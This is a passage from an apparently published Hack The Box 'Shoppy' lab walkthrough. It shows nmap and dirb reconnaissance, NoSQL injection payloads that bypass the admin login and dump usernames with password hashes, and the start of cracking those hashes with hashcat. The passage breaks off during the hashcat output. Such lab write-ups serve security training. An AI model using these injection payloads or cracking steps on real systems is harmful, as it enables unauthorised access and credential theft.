---
title: HTB Shoppy Walkthrough
url: https://www.secjuice.com/htb-shoppy-walkthrough/
source: Over Security - Cybersecurity news aggregator
date: 2024-09-03
fetch_date: 2025-10-06T18:27:28.139141
---

# HTB Shoppy Walkthrough

[![Secjuice](https://www.secjuice.com/content/images/2018/12/Logo-1.png)](https://www.secjuice.com)

* [Donate](https://opencollective.com/secjuice)
* [About Us](https://secjuice.com/about-us/)
* [Technical](https://secjuice.com/tag/technical/)
* [OSINT](https://secjuice.com/tag/OSINT/)
* [Unusual Journeys](https://secjuice.com/tag/unusual-journeys-into-infosec/)
* [HoF](https://secjuice.com/secjuice-hall-of-fame/)
* [Write With Us](https://secjuice.com/join-secjuice-writing-team/)
* [Hire A Writer](https://secjuice.com/hire-infosec-cybersecurity-writer/)
* [Rankings](https://secjuice.com/secjuice-writers-ranking/)

[Sign in](#/portal/signin)
[Subscribe](#/portal/signup)

# HTB Shoppy Walkthrough

Explore how to hack a vulnerable admin portal.

* [![Andy74](/content/images/size/w100/2020/01/avatar.png)](/author/andy74/)

#### [Andy74](/author/andy74/)

Sep 2, 2024
• 22 min read

![HTB Shoppy Walkthrough](/content/images/size/w2000/2024/09/secjuice-labor-day02.png)

This image was generated using Microsoft Copilot.

A simple BOX to start or stay trained.

Let's start with the **nmap** scan.

```
Starting Nmap 7.93 ( https://nmap.org ) at 2022-10-29 21:32 CEST
Nmap scan report for 10.10.11.180
Host is up (0.11s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey:
|   3072 9e5e8351d99f89ea471a12eb81f922c0 (RSA)
|   256 5857eeeb0650037c8463d7a3415b1ad5 (ECDSA)
|_  256 3e9d0a4290443860b3b62ce9bd9a6754 (ED25519)
80/tcp open  http    nginx 1.23.1
|_http-server-header: nginx/1.23.1
|_http-title: Did not follow redirect to http://shoppy.htb
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 38.80 seconds
```

Classic BOX with only the **HTTPS** port ***80*** on which to retrieve the information for the *foothold* and port ***22*** for the accesses of the users that we will find. Insert **shoppy.htb** into **/etc/hosts** and navigate the web.

![](https://www.secjuice.com/content/images/2022/11/img-00.png)

A simple countdown shows how far away from a hypothetical date which in my case seems to be the next day. I investigated to anticipate the deadline of the countdown and see what would happen. However, I discovered that in reality, the deadline is ***2030,*** and that the years are not shown on the counter. Moreover the code does not seem to do anything at the end, so it is perhaps a false trace.

```
$('#countdown').countdown({
	date: "2030/10/31",
	render: function(data) {
	  var el = $(this.el);
	  el.empty()
	    //.append("<div>" + this.leadingZeros(data.years, 4) + "<span>years</span></div>")
	    .append("<div>" + this.leadingZeros(data.days, 2) + " <span>days</span></div>")
	    .append("<div>" + this.leadingZeros(data.hours, 2) + " <span>hrs</span></div>")
	    .append("<div>" + this.leadingZeros(data.min, 2) + " <span>min</span></div>")
	    .append("<div>" + this.leadingZeros(data.sec, 2) + " <span>sec</span></div>");
	}
});
```

Since there are no navigable sections in the portal, I try a session with the **dirb** in search of hidden routes.

```
┌──(in7rud3r㉿kali-muletto)-[~/Dropbox/hackthebox/_10.10.11.180 - Shoppy (lin)]
└─$ dirb http://shoppy.htb

-----------------
DIRB v2.22
By The Dark Raver
-----------------

START_TIME: Sat Oct 29 21:46:08 2022
URL_BASE: http://shoppy.htb/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612

---- Scanning URL: http://shoppy.htb/ ----
+ http://shoppy.htb/admin (CODE:302|SIZE:28)
+ http://shoppy.htb/Admin (CODE:302|SIZE:28)
+ http://shoppy.htb/ADMIN (CODE:302|SIZE:28)
+ http://shoppy.htb/assets (CODE:301|SIZE:179)
+ http://shoppy.htb/css (CODE:301|SIZE:173)
+ http://shoppy.htb/exports (CODE:301|SIZE:181)
+ http://shoppy.htb/favicon.ico (CODE:200|SIZE:213054)
+ http://shoppy.htb/fonts (CODE:301|SIZE:177)
+ http://shoppy.htb/images (CODE:301|SIZE:179)
+ http://shoppy.htb/js (CODE:301|SIZE:171)
+ http://shoppy.htb/login (CODE:200|SIZE:1074)
+ http://shoppy.htb/Login (CODE:200|SIZE:1074)

-----------------
END_TIME: Sat Oct 29 21:55:37 2022
DOWNLOADED: 4612 - FOUND: 12
```

Some interesting routes come out. Obviously, the *admin* section cannot be reached until after logging in.

![](https://www.secjuice.com/content/images/2022/11/img-01.png)

While the *exports* did not seem to accept methods in **GET**, it still doesn't fare any better with **POST** or **PUT** which I tried via **postman**.

![](https://www.secjuice.com/content/images/2022/11/img-02.png)

Entering some value and trying to log in, I get a "*Wrong Credential*" message, then I try some **SQLi** (**SQL injection**) and as I insert a *single quote* in the username field, after a relatively long time I get a ***503*** error (*Gateway Time-out*). So I insist on this path in search of the correct *payload*, first with the classics.

```
' or '' = '
```

But every attempt ends in 503. Then I find a combination that finally gives me a "*Wrong Credential*" again, keeping the *single quote*

```
' || '' == '
```

Processing and proceeding on this path, I finally arrive at the suitable *payload* that grants me access to the portal.

```
' || 1==1 || ''== '
```

![](https://www.secjuice.com/content/images/2022/11/img-03.png)

Perfect. With the exception of the order report, you can search for users through a simple form and download the result (using the *exports* routes found before).

![](https://www.secjuice.com/content/images/2022/11/img-04.png)

Obviously, the first search I do is for "**admin**", which still gives me a good result.

```
[{"_id":"62db0e93d6d6a999a66ee67a","username":"admin","password":"23c6877d9e2b564ef8b32c3a23de27b2"}]
```

But, using the same *injection* used to access the portal, the list of users grows (slightly, but grows).

```
[{"_id":"62db0e93d6d6a999a66ee67a","username":"admin","password":"23c6877d9e2b564ef8b32c3a23de27b2"},{"_id":"62db0e93d6d6a999a66ee67b","username":"josh","password":"6ebcea65320589ca4f2f1ce039975995"}]
```

Let's try to understand what kind of *encryption* was used for the *password*, using one of the two.

```
┌──(in7rud3r㉿kali-muletto)-[~/…/hackthebox/_10.10.11.180 - Shoppy (lin)/attack/hc]
└─$ echo 23c6877d9e2b564ef8b32c3a23de27b2 > pwd1.hash                                                                                                                                               255 ⨯

┌──(in7rud3r㉿kali-muletto)-[~/…/hackthebox/_10.10.11.180 - Shoppy (lin)/attack/hc]
└─$ hashcat pwd1.hash
hashcat (v6.2.6) starting in autodetect mode

/sys/class/hwmon/hwmon4/temp1_input: No such file or directory

OpenCL API (OpenCL 3.0 PoCL 3.0+debian  Linux, None+Asserts, RELOC, LLVM 13.0.1, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
============================================================================================================================================
* Device #1: pthread-Intel(R) Core(TM)2 Duo CPU     T8300  @ 2.40GHz, 1414/2892 MB (512 MB allocatable), 2MCU

The following 11 hash-modes match the structure of your input hash:

      # | Name                                                       | Category
  ======+============================================================+======================================
    900 | MD4                                                        | Raw Hash
      0 | MD5                                                        | Raw Hash
     70 | md5(utf16le($pass))                                        | Raw Hash
   2600 | md5(md5($pass))                                            | Raw Hash salted and/or iterated
   3500 | md5(md5(md5($pass)))                                       | Raw Hash salted and/or iterated
   4400 | md5(sha1($pass))                                           | Raw Hash salted and/or iterated
  20900 | md5(sha1($pass...